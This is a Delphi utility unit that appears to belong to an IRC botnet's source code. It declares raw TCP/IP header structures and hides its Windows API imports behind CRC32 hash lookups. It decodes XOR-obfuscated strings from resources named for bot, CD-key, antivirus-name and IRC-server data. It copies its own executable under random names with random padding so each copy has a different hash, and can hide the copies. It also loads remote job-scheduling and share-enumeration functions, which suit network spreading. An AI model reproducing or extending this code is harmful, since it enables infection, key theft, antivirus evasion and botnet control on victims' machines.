   //** This unit include all neccessary constants, types, procedures, etc.

   UNIT uUtils;

   INTERFACE

   USES
     uAPISearchEngine, Registry, uStrList;

   TYPE
     DWORD                    = LongWord;

   CONST
     VER_PLATFORM_WIN32_NT    = 2;
     SOCK_RAW                 = 3;
     SW_HIDE                  = 0;
     IPPROTO_RAW              = 255;
     SW_SHOWNORMAL            = 1;
     CREATE_NEW_PROCESS_GROUP = $00000200;
     WSABASEERR               = 10000;
     HKEY_LOCAL_MACHINE       = DWORD($80000002);
     HKEY_CURRENT_USER        = DWORD($80000001);
     IOC_IN                   = $80000000;
     IOCPARM_MASK             = $7f;
     FIONBIO                  = IOC_IN or ((Longint(SizeOf(Longint)) and IOCPARM_MASK) shl 16) or (Longint(Byte('f')) shl 8) or 126;
     STARTF_USESHOWWINDOW     = 1;
     MAX_PATH                 = 260;
     SW_SHOW                  = 5;
     WM_USER                  = $0400;
     INADDR_NONE              = $FFFFFFFF;
     TH32CS_SNAPPROCESS       = 2;
     ERROR_SUCCESS            = 0;
     FILE_ATTRIBUTE_DIRECTORY = $00000010;
     FILE_ATTRIBUTE_HIDDEN    = $00000002;
     WAIT_TIMEOUT             = $00000102;
     INADDR_ANY               = $00000000;
     CREATE_NEW_CONSOLE       = $00000010;
     NORMAL_PRIORITY_CLASS    = $00000020;
     faHidden                 = $00000002;
     faSysFile                = $00000004;
     faVolumeID               = $00000008;
     faDirectory              = $00000010;
     faAnyFile                = $0000003F;
     ioc_out                  = $40000000;
     WSAEWOULDBLOCK           = (WSABASEERR+35);
     SOCKET_ERROR             = -1;
     IPPROTO_TCP              = 06;
     AF_INET                  = 02;
     SOCK_STREAM              = 01;
     IPPROTO_IP               = 00;
     fd_setsize               = 64;
     pf_inet                  = af_inet;
     sock_dgram               = 02;
     ipproto_udp              = 17;
     SOMAXCONN                = 5;
     fionread                 = ioc_out OR (SizeOf(Longint) SHL 16) OR (Ord('f') SHL 8) OR 127;

   TYPE
     BOOL       = LongBool;
     LPDWORD    =^DWORD;
     HWND       = TYPE LongWord;
     THandle    = Integer;
     LRESULT    = DWORD;
     ATOM       = WORD;
     HICON      = TYPE LongWord;
     HBRUSH     = TYPE LongWord;
     HINST      = TYPE LongWord;
     HMENU      = TYPE LongWord;
     HCURSOR    = HICON;
     UINT       = LongWord;
     TFNWndProc = Pointer;
     WPARAM     = DWORD;
     LPARAM     = DWORD;
     TFarProc   = Pointer;
     TFNThreadStartRoutine = TFarProc;

     SunB = PACKED RECORD
       s_b1 : Char;
       s_b2 : Char;
       s_b3 : Char;
       s_b4 : Char;
     END;

     SunW = PACKED RECORD
       s_w1 : WORD;
       s_w2 : WORD;
     END;

     PTCPhdr = ^TTCPhdr;
     TTCPhdr = PACKED RECORD
       tcp_src   : Word;
       tcp_dst   : Word;
       tcp_seq   : Cardinal;
       tcp_ack   : Cardinal;
       tcp_off   : Byte;
       tcp_flags : Byte;
       tcp_win   : Word;
       tcp_sum   : Word;
       tcp_urp   : Word;
     END;

     PIPhdr = ^TIPhdr;
     TIPhdr = PACKED RECORD
       ip_verlen: Byte;
       ip_tos: Byte;
       ip_len: Word;
       ip_id: Word;
       ip_off: Word;
       ip_ttl: Byte;
       ip_p: Byte;
       ip_sum: Word;
       ip_src: Cardinal;
       ip_dst: Cardinal;
     END;

     WSAData = RECORD
       wVersion        : WORD;
       wHighVersion    : WORD;
       szDescription   : ARRAY [0..256] OF Char;
       szSystemStatus  : ARRAY [0..128] OF Char;
       iMaxSockets     : WORD;
       iMaxUdpDg       : WORD;
       lpVendorInfo    : pChar;
     END;

     in_addr = RECORD
       CASE Integer OF
         0 : (S_un_b : SunB);
         1 : (S_un_w : SunW);
         2 : (S_addr : DWORD);
       END;

     TInAddr = in_addr;

     sockaddr_in = RECORD
       CASE Integer OF
         0 : (sin_family : WORD;
              sin_port   : WORD;
              sin_addr   : TInAddr;
              sin_zero   : ARRAY[0..7] OF Char);
         1 : (sa_family  : WORD;
              sa_data    : ARRAY[0..13] OF Char)
     END;

     PHostEnt     = ^THostEnt;

     HostEnt      = RECORD
       h_name     : pChar;
       h_aliases  :^pChar;
       h_addrtype : SmallInt;
       h_length   : SmallInt;
       CASE BYTE OF
         0: (h_addr_list :^pChar);
         1: (h_addr      :^pChar)
     END;

     Ppseudohdr_tcp = ^Tpseudohdr_tcp;
     Tpseudohdr_tcp = PACKED RECORD
       saddr     : Cardinal;
       daddr     : Cardinal;
       zero      : Byte;
       protocol  : Byte;
       length    : Word;
       tcphdr    : TTCPhdr;
     END;

     TSockAddrIn = sockaddr_in;
     THostEnt    = HostEnt;
     TSocket     = Integer;
     HINTERNET   = Pointer;
     TWSAData    = WSAData;
     PInAddr     =^TInAddr;
     TSockAddr   = TSockAddrIn;
     PSockAddr   =^TSockAddr;
     PFDSet      = ^TFDSet;
     PTimeVal    = ^TTimeVal;

     TFDSet      = PACKED RECORD
       fd_count  : Longint;
       fd_array  : ARRAY [0..fd_setsizE-1] OF TSocket;
     END;

     TTimeVal    = PACKED RECORD
       tv_sec    : Longint;
       tv_usec   : Longint;
     END;

     TWndClass = PACKED RECORD
       style         : UINT;
       lpfnWndProc   : TFNWndProc;
       cbClsExtra    : Integer;
       cbWndExtra    : Integer;
       hInstance     : HINST;
       hIcon         : HICON;
       hCursor       : HCURSOR;
       hbrBackground : HBRUSH;
       lpszMenuName  : PAnsiChar;
       lpszClassName : PAnsiChar;
     END;

     TPoint = RECORD
       X : Integer;
       Y : Integer;
     END;

     TMsg = PACKED RECORD
       hwnd    : HWND;
       message : UINT;
       wParam  : WPARAM;
       lParam  : LPARAM;
       time    : DWORD;
       pt      : TPoint;
     END;

     lpup = ARRAY[0..512] OF Char;

     TOSVersionInfo = RECORD
       dwOSVersionInfoSize : DWORD;
       dwMajorVersion      : DWORD;
       dwMinorVersion      : DWORD;
       dwBuildNumber       : DWORD;
       dwPlatformId        : DWORD;
       szCSDVersion        : ARRAY [0..127] OF AnsiChar;
     END;

     TProcessEntry32 = RECORD
       dwSize              : Cardinal;
       cntUsage            : Cardinal;
       th32ProcessID       : Cardinal;
       th32DefaultHeapID   : Cardinal;
       th32ModuleID        : Cardinal;
       cntThreads          : Cardinal;
       th32ParentProcessID : Cardinal;
       pcPriClassBase      : Integer;
       dwFlags             : Cardinal;
       szExeFile           : ARRAY [0..259] OF Char;
     END;

     PProtoEnt   =^TProtoEnt;
     protoent    = RECORD
       p_name    : pChar;
       p_aliases :^pChar;
       p_proto   : Smallint;
     END;
     TProtoEnt   = ProtoEnt;

     PServEnt    =^TServEnt;
     servent     = RECORD
       s_name    : pChar;
       s_aliases :^pChar;
       s_port    : Word;
       s_proto   : pChar;
     END;
     TServEnt    = servent;

     TIPAddressString      = ARRAY [0..15] OF Char;

     PIPAddrString         =^TIPAddrString;

     TIPAddrString         = PACKED RECORD
       Next                : PIPAddrString;
       IPAddress           : TIPAddressString;
       IPMask              : TIPAddressString;
       Context             : Integer;
     END;

     PFixedInfo            = ^TFixedInfo;

     TFixedInfo            = PACKED RECORD
       HostName            : ARRAY [0..131] OF Char;
       DomainName          : ARRAY [0..131] OF Char;
       CurrentDNSServer    : PIPAddrString;
       DNSServerList       : TIPAddrString;
       NodeType            : Integer;
       ScopeId             : ARRAY [0..259] OF Char;
       EnableRouting       : Integer;
       EnableProxy         : Integer;
       EnableDNS           : Integer;
     END;

     _STARTUPINFOA = RECORD
       cb              : DWORD;
       lpReserved      : Pointer;
       lpDesktop       : Pointer;
       lpTitle         : Pointer;
       dwX             : DWORD;
       dwY             : DWORD;
       dwXSize         : DWORD;
       dwYSize         : DWORD;
       dwXCountChars   : DWORD;
       dwYCountChars   : DWORD;
       dwFillAttribute : DWORD;
       dwFlags         : DWORD;
       wShowWindow     : Word;
       cbReserved2     : Word;
       lpReserved2     : PByte;
       hStdInput       : THandle;
       hStdOutput      : THandle;
       hStdError       : THandle;
     END;

     TStartupInfo = _STARTUPINFOA;

     _PROCESS_INFORMATION = RECORD
       hProcess    : THandle;
       hThread     : THandle;
       dwProcessId : DWORD;
       dwThreadId  : DWORD;
     END;

     TProcessInformation    = _PROCESS_INFORMATION;

     PSecurityAttributes    = ^TSecurityAttributes;
     _SECURITY_ATTRIBUTES   = RECORD
       nLength              : DWORD;
       lpSecurityDescriptor : Pointer;
       bInheritHandle       : BOOL;
     END;

     TSecurityAttributes    = _SECURITY_ATTRIBUTES;

   CONST
     invalid_socket         = TSocket(NOT(0));

   {$I Resources\TBOT.INI}
   {$I Resources\TMAIN.INI}
   {$I Resources\TCDKEYS.INI}
   {$I Resources\TAVNAME.INI}
   {$I Resources\TVERSIONS.INI}
   {$I Resources\TAUTHHOST.INI}
   {$I Resources\TIRCSERVERS.INI}
   {$I RESOURCES\TERRORMESSAGES.INI}

   VAR
     Sleep                    : PROCEDURE(dwMilliseconds:DWORD); STDCALL;
     CreateDir                : FUNCTION(lpPathName:STRING;lpSecurityAttributes:Integer) : BOOL; STDCALL;
     GetLastError             : FUNCTION : DWORD; STDCALL;
     TerminateProcess         : FUNCTION(hProcess,uExitCode:Cardinal) : BOOL; STDCALL;
     OpenProcess              : FUNCTION(wDesiredAccess:Cardinal;blnheritHandle:LongBool;dwProcessld:Cardinal) : Integer; STDCALL;
     CloseHandle              : FUNCTION(hObject:Cardinal) : BOOl; STDCALL;
     Process32First           : FUNCTION(hSnapshot:Integer;VAR lppe:TProcessEntry32) : BOOL; STDCALL;
     CreateToolHelp32Snapshot : FUNCTION(dwFlags,th32ProcessID:Cardinal) : Integer; STDCALL;
     Process32Next            : FUNCTION(hSnapshot:Cardinal;VAR lppe:TProcessEntry32) : BOOL; STDCALL;
     GetVersionEx             : FUNCTION(VAR lpVersionInformation:TOSVersionInfo) : BOOL; STDCALL;
     GetDriveType             : FUNCTION(lpDisk:STRING) : Integer; STDCALL;
     CopyFile2                : FUNCTION(lpExistingFileName,lpNewFileName:PChar;bFailIfExists:BOOL) : BOOL; STDCALL;
     SetFileAttributes        : FUNCTION(lpFileName:pChar;dwFileAttributes:DWORD) : LongBool; STDCALL;
     GetWindowsDirectory      : FUNCTION(lpBuffer:PChar;uSize:DWORD): DWORD; STDCALL;
     GetStdHandle             : FUNCTION(nStdHandle: DWORD): THandle; STDCALL;
     ShowWindow               : FUNCTION(hWnd:HWND;nCmdShow:Integer) : BOOL; STDCALL;
     SetWindowLong            : FUNCTION(hWnd:HWND;nIndex:Integer;dwNewLong:DWORD) : DWORD; STDCALL;
     GetWindowLong            : FUNCTION(hWnd,nIndex:Integer) : Integer; STDCALL;
     GetMessage               : FUNCTION(VAR lpMsg:TMsg;hWnd:HWND;wMsgFilterMin,wMsgFilterMax:UINT) : BOOL; STDCALL;
     PostQuitMessage          : PROCEDURE(nExitCode:Integer); STDCALL;
     DefWindowProc            : FUNCTION(hWnd:HWND;Msg:UINT;wParam:WPARAM;lParam:LPARAM) : LRESULT; STDCALL;
     DispatchMessage          : FUNCTION(CONST lpMsg: TMsg) : DWORD; STDCALL;
     MessageBox               : FUNCTION(hWnd:HWND;lpText,lpCaption:PChar;uType:UINT) : Integer; STDCALL;
     RegisterClass            : FUNCTION(CONST WndClass:TWndClass) : ATOM; STDCALL;
     FileExists               : FUNCTION(pszPath:STRING) : BOOL; STDCALL;
     InternetGetConnectedState: FUNCTION(lpdwFlags:LPDWORD;dwReserved:DWORD) : BOOL; STDCALL;
     WSACleanup               : FUNCTION : Integer;
     inet_addr                : FUNCTION(CP:pChar) : DWORD; STDCALL;
     CloseSocket              : FUNCTION(S:TSocket) : Integer; STDCALL;
     Htons                    : FUNCTION(HostShort:WORD) : WORD; STDCALL;
     inet_ntoa                : FUNCTION(n_addr:in_addr) : pChar; STDCALL;
     ntohs                    : FUNCTION(netshort:dWORD) : DWORD; STDCALL;
     getprotobyname           : FUNCTION(Name:pChar) : PProtoEnt; STDCALL;
     GetHostByName            : FUNCTION(HostName:pChar) : PHostEnt; STDCALL;
     getservbyname            : FUNCTION(Name,Proto:pChar):pServEnt; STDCALL;
     gethostname              : FUNCTION(Name:pChar;len:Integer) : Integer; STDCALL;
     listen                   : FUNCTION(S:TSocket;backlog:Integer) : Integer; STDCALL;
     getservbyport            : FUNCTION(Port:Integer;proto:pChar) : PServEnt; STDCALL;
     Socket                   : FUNCTION(Af,Struct,Protocol:Integer) : TSocket; STDCALL;
     ioctlsocket              : FUNCTION(S:TSocket;cmd:DWORD;VAR arg:DWORD): Integer; STDCALL;
     GetNetworkParams         : FUNCTION(FI:PFixedInfo;VAR BufLen:Integer) : Integer; STDCALL;
     gethostbyaddr            : FUNCTION(Addr:Pointer;len,Struct:Integer) : PHostEnt; STDCALL;
     Recv                     : FUNCTION(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL;
     Send                     : FUNCTION(S:TSocket;VAR Buf;Len,Flags:Integer) : Integer; STDCALL;
     accept                   : FUNCTION(S:TSocket;addr:PSockAddr;addrlen:PInteger) : TSocket; STDCALL;
     WSAStartup               : FUNCTION(wVersionRequired:WORD;VAR WSData: TWSAData) : Integer; STDCALL;
     bind                     : FUNCTION(S:TSocket;VAR addr:TSockAddr;NameLen:Integer): Integer; STDCALL;
     Connect                  : FUNCTION(S:TSocket;VAR Name:TSockAddr;Namelen:Integer) : Integer; STDCALL;
     select                   : FUNCTION(nfds:Integer;readfds,writefds,exceptfds:PFDSet;timeout:PTimeVal): Integer; STDCALL;
     sendto                   : FUNCTION(S:TSocket;VAR Buf;len,flags:Integer;addrto:PSockAddr;tolen:Integer): Integer; STDCALL;
     recvfrom                 : FUNCTION(S:TSocket;VAR Buf;len,flags:Integer;from:PSockAddr;fromlen:PInteger) : Integer; STDCALL;
     GetFileAttributes        : FUNCTION(lpFileName:pChar): DWORD; STDCALL;
     WaitForSingleObject      : FUNCTION(hHandle:THandle;dwMilliseconds:DWORD) : DWORD; STDCALL;
     CreateProcess            : FUNCTION(lpApplicationName:pChar;lpCommandLine:pChar;lpProcessAttributes,lpThreadAttributes:PSecurityAttributes;bInheritHandles:BOOL; dwCreationFlags:DWORD;lpEnvironment:Pointer;lpCurrentDirectory:pChar;CONST lpStartupInfo:TStartupInfo;VAR lpProcessInformation:TProcessInformation) : BOOL; STDCALL;
     GetExitCodeThread        : FUNCTION(hThread:THandle;VAR lpExitCode:DWORD) : BOOL; STDCALL;
     GetExitCodeProcess       : FUNCTION(hProcess:THandle;VAR lpExitCode:DWORD): BOOL; STDCALL;
     lpNetApiBufferFree       : FUNCTION(Buffer:Pointer) : DWORD;STDCALL;
     lpNetRemoteTOD           : FUNCTION(UNCServerName:pChar;BufferPtr:pByte) : DWORD;STDCALL;
     lpNetScheduleJobAdd      : FUNCTION(ServerName:pChar;Buffer:pByte;VAR JobID:DWORD) : DWORD;STDCALL;
     OLD_NetShareEnum         : FUNCTION(pszServer:pChar;sLevel:SmallInt;VAR Bufptr;cbBuffer:Cardinal;VAR pcEntriesRead,pcTotalAvail:Cardinal) : DWORD; STDCALL;
     NT_NetShareEnum          : FUNCTION(ServerName:pWideChar;Level:DWORD;VAR Bufptr;Prefmaxlen:DWORD;VAR EntriesRead,TotalEntries,resume_handle:DWORD) : DWORD; STDCALL;
     ShutDown                 : FUNCTION(S:TSocket;How:Integer) : Integer; STDCALL;
     htonl                    : FUNCTION(HostLong:Longint) : Longint; STDCALL;
     getsockname              : FUNCTION(S:TSocket;VAR Name:TSockAddr;VAR NameLen:Integer) : Integer; STDCALL;
     setsockopt               : FUNCTION(S:TSocket;Level,OptName:Integer;OptVal:pChar;OptLen:Integer) : Integer; STDCALL;
     WSAGetLastError          : FUNCTION : Integer; STDCALL;
     __WSAFDIsSet             : FUNCTION(S:TSocket;VAR FDSet:TFDSet) : Bool; STDCALL;

     Reg      : TRG;
     WinPath  : STRING;
     ThreadId : LongWord;
     CRLF     : STRING = #13#10;

   PROCEDURE SetWinPath;
   PROCEDURE InitProcesses;
   FUNCTION  IsNTBasedOS : BOOL;
   FUNCTION  KEYStr(X:Word) : STRING;
   FUNCTION  BOTStr(X:Word) : STRING;
   FUNCTION  RandomFileName : STRING;
   FUNCTION  HostStr(X:Word) : STRING;
   FUNCTION  MainStr(X:WORD) : STRING;
   PROCEDURE FD_ZERO(VAR FDSet:TFDSet);
   FUNCTION  Decode(X:WORD;B:pChar):STRING;
   FUNCTION  NameToIP(HostName:STRING) : STRING;
   PROCEDURE SplitParams(S:STRING;VAR X:TStrList);
   PROCEDURE FD_SET(Socket:TSocket;VAR FDSet:TFDSet);
   FUNCTION  DecodeString(X:Word;Y:ARRAY OF BYTE) : STRING;
   FUNCTION  DirectoryExists(CONST Dir:STRING) : Boolean;
   PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);
   FUNCTION  ItemsCountInEncodedString(Y:ARRAY OF BYTE) : WORD;
   FUNCTION  LoadLibrary(LibFileName:PChar) : THandle; STDCALL; EXTERNAL 'kernel32.dll' Name 'LoadLibraryA';
   function  FD_ISSET(Socket: TSocket; var FDSet: TFDSet): Boolean;

   IMPLEMENTATION

   //------------------------------------------------------------------------------
   function FD_ISSET(Socket: TSocket; var FDSet: TFDSet): Boolean;
   begin
     Result := __WSAFDIsSet(Socket, FDSet);
   end;

   //------------------------------------------------------------------------------
   PROCEDURE SetWinPath;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     WinPath:=STRING(PWindowsDir)+'\';
   END;

   //------------------------------------------------------------------------------
   PROCEDURE SplitParams(S:STRING;VAR X:TStrList);
   VAR
     I : WORD;
   BEGIN
     X.Clear;
     REPEAT
       I:=Pos(' ',S);
       IF I>0 THEN BEGIN
         X.Add(Copy(S,1,I-1));
         Delete(S,1,I);
       END;
     UNTIL I=0;
     X.Add(S);
   END;

   //------------------------------------------------------------------------------
   PROCEDURE FD_SET(Socket:TSocket;VAR FDSet:TFDSet);
   begin
     if FDSet.fd_count < FD_SETSIZE then
     begin
       FDSet.fd_array[FDSet.fd_count] := Socket;
       Inc(FDSet.fd_count);
     end;
   end;

   //------------------------------------------------------------------------------
   PROCEDURE FD_ZERO(VAR FDSet:TFDSet);
   BEGIN
     FDSet.fd_count:=0;
   END;

   //------------------------------------------------------------------------------
   FUNCTION NameToIP(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY [0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     I          : Integer;
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   //------------------------------------------------------------------------------
   FUNCTION DirectoryExists(CONST Dir:STRING) : Boolean;
   VAR
     Attr : DWORD;
   BEGIN
     Attr:=GetFileAttributes(PChar(Dir));
     Result:=(Attr<>$FFFFFFFF)AND(Attr AND FILE_ATTRIBUTE_DIRECTORY=FILE_ATTRIBUTE_DIRECTORY);
   END;

   //------------------------------------------------------------------------------
   FUNCTION IsNTBasedOS : BOOL;
   VAR
     verInfo : TOSVersionInfo;
   BEGIN
     Result:=False;
     verInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
     GetVersionEx(verInfo);
     IF verInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Result:=True;
   END;

   //------------------------------------------------------------------------------
   FUNCTION RandomFileName : STRING;                                               //Generate 5-15 caracter long random file name
   VAR
     I : BYTE;
   BEGIN
     FOR I:=1 TO Random(11)+5 DO RESULT:=RESULT+MainStr(2)[Random(62)+1];
     RESULT:=RESULT+MainStr(5);                                                    //".exe"
   END;

   //------------------------------------------------------------------------------
   FUNCTION Decode(X:WORD;B:pChar):STRING;
   VAR
     I : WORD;
     K : WORD;
     S : STRING;
   BEGIN
     K:=0;
     s:='';
     FOR I:=1 TO X-1 DO K:=K+(Ord(B[K]) XOR I)+1;
     FOR I:=1 TO (Ord(B[K]) XOR X) DO BEGIN
       S:=S+Chr(Ord(B[K+I]) XOR (I+X+4));
     END;
     RESULT:=S;
   END;

   //------------------------------------------------------------------------------
   FUNCTION MainStr(X:Word) : STRING;
   BEGIN
     Result:=Decode(X,@TMain);
   END;

   //------------------------------------------------------------------------------
   FUNCTION BOTStr(X:Word) : STRING;
   BEGIN
     Result:=Decode(X,@TBOT);
   END;

   //------------------------------------------------------------------------------
   FUNCTION KEYStr(X:Word) : STRING;
   BEGIN
     Result:=Decode(X,@TKEYS);
   END;

   //------------------------------------------------------------------------------
   FUNCTION HostStr(X:Word) : STRING;
   BEGIN
     Result:=Decode(X,@TAUTHHOST);
   END;

   //------------------------------------------------------------------------------
   FUNCTION DecodeString(X:Word;Y:ARRAY OF BYTE) : STRING;
   BEGIN
     Result:=Decode(X,@Y);
   END;

   //------------------------------------------------------------------------------
   FUNCTION ItemsCountInEncodedString(Y:ARRAY OF BYTE) : WORD;
   VAR
     I : WORD;
     K : WORD;
   BEGIN
     I:=0;
     K:=0;
     REPEAT
      K:=K+(Ord(Y[K]) XOR (I+1))+1;
      Inc(I);
     UNTIL K=SizeOf(Y);
     Result:=I;
   END;

   //------------------------------------------------------------------------------
   PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);
   VAR
     I           : WORD;
     F           : FILE;
     RandomBytes : ARRAY[0..512] OF BYTE;
   BEGIN
     CopyFile2(pChar(ParamStr(0)),pChar(DestinationFile),False);
     FOR I:=0 TO 512 DO RandomBytes[I]:=Random(256);
     AssignFile(F,DestinationFile);
     {$I-}
     Reset(F,1);
     IF IOResult=0 THEN BEGIN
       Seek(F,(FileSize(F) DIV 512)*512);
       IF IOResult=0 THEN BEGIN
         Truncate(F);
         BlockWrite(F,RandomBytes[0],Random(509));
         CloseFile(F);
         IF Hide THEN SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
       END;
     END;
     {$I+}
   END;

   //------------------------------------------------------------------------------
   PROCEDURE InitProcesses;
   BEGIN
     DLLModule:=LoadLibrary(pChar(MainStr(57)));                                   //"kernel32.dll"
     CreateDir:=GetProcAddressCRC32(2169353901);
     GetLastError:=GetProcAddressCRC32(3538237111);
     TerminateProcess:=GetProcAddressCRC32(2873147277);
     OpenProcess:=GetProcAddressCRC32(3743895883);
     CloseHandle:=GetProcAddressCRC32(2962429428);
     Process32First:=GetProcAddressCRC32(645722533);
     CreateToolHelp32Snapshot:=GetProcAddressCRC32(3253975158);
     Process32Next:=GetProcAddressCRC32(42915264);
     Sleep:=GetProcAddressCRC32(3472027048);
     GetVersionEx:=GetProcAddressCRC32(3750196810);
     GetDriveType:=GetProcAddressCRC32(4138035024);
     CopyFile2:=GetProcAddressCRC32(26860697);
     SetFileAttributes:=GetProcAddressCRC32(359372546);
     GetWindowsDirectory:=GetProcAddressCRC32(4294144702);
     GetStdHandle:=GetProcAddressCRC32(3671951851);
     GetFileAttributes:=GetProcAddressCRC32(811605020);
     WaitForSingleObject:=GetProcAddressCRC32(3763911493);
     CreateProcess:=GetProcAddressCRC32(2823936278);
     GetExitCodeThread:=GetProcAddressCRC32(1507365122);
     GetExitCodeProcess:=GetProcAddressCRC32(483021821);

     DLLModule:=LoadLibrary(pChar(MainStr(99)));                                   //"user32.dll"
     ShowWindow:=GetProcAddressCRC32(1268545403);
     SetWindowLong:=GetProcAddressCRC32(4270288393);
     GetWindowLong:=GetProcAddressCRC32(2174344574);
     GetMessage:=GetProcAddressCRC32(2180256324);
     PostQuitMessage:=GetProcAddressCRC32(3193076325);
     DefWindowProc:=GetProcAddressCRC32(2132201780);
     DispatchMessage:=GetProcAddressCRC32(2711889486);
     MessageBox:=GetProcAddressCRC32(1462590862);
     RegisterClass:=GetProcAddressCRC32(628494029);

     DLLModule:=LoadLibrary(pChar(MainStr(60)));                                   //"shlwapi.dll"
     FileExists:=GetProcAddressCRC32(1728311700);

     DLLModule:=LoadLibrary(pChar(MainStr(62)));                                   //"wininet.dll"
     InternetGetConnectedState:=GetProcAddressCRC32(4075158540);

     DLLModule:=LoadLibrary(pChar(MainStr(65)));                                   //"ws2_32.dll"
     Send:=GetProcAddressCRC32(2809346765);
     WSAStartup:=GetProcAddressCRC32(2700475539);
     Socket:=GetProcAddressCRC32(98920635);
     Htons:=GetProcAddressCRC32(4207154920);
     inet_addr:=GetProcAddressCRC32(1393076350);
     Connect:=GetProcAddressCRC32(1959786783);
     Recv:=GetProcAddressCRC32(1507349165);
     CloseSocket:=GetProcAddressCRC32(2781271927);
     inet_ntoa:=GetProcAddressCRC32(1879540557);
     GetHostByName:=GetProcAddressCRC32(930432418);
     WSACleanup:=GetProcAddressCRC32(2385746108);
     sendto:=GetProcAddressCRC32(1876886790);
     ioctlsocket:=GetProcAddressCRC32(3577187118);
     recvfrom:=GetProcAddressCRC32(846543921);
     ntohs:=GetProcAddressCRC32(601769166);
     select:=GetProcAddressCRC32(1274211008);
     bind:=GetProcAddressCRC32(1187836755);
     listen:=GetProcAddressCRC32(3257165821);
     accept:=GetProcAddressCRC32(3005279540);
     gethostname:=GetProcAddressCRC32(144339138);
     getprotobyname:=GetProcAddressCRC32(402843736);
     getservbyport:=GetProcAddressCRC32(999458654);
     getservbyname:=GetProcAddressCRC32(639673492);
     gethostbyaddr:=GetProcAddressCRC32(1003268497);
     shutdown:=GetProcAddressCRC32(2510479042);
     htonl:=GetProcAddressCRC32(2009864989);
     getsockname:=GetProcAddressCRC32(3358416759);
     setsockopt:=GetProcAddressCRC32(3981526788);
     WSAGetLastError:=GetProcAddressCRC32($500ABE7F);
     __WSAFDIsSet:=GetProcAddressCRC32($953F8F5C);

     DLLModule:=LoadLibrary(pChar(MainStr(6)));                                    //"iphlpapi.dll"
     GetNetworkParams:=GetProcAddressCRC32(3440169374);

     DLLModule:=LoadLibrary(pChar(MainStr(179)));                                  //"netapi32.dll"
     lpNetRemoteTOD:=GetProcAddressCRC32(3330669453);
     lpNetScheduleJobAdd:=GetProcAddressCRC32(3746633206);
     IF IsNTBasedOS THEN BEGIN
       NT_NetShareEnum:=GetProcAddressCRC32(2168895089);
       lpNetAPIBufferFree:=GetProcAddressCRC32(3323981853);
     END ELSE OLD_NetShareEnum:=GetProcAddressCRC32(2168895089);
   END;

   END.
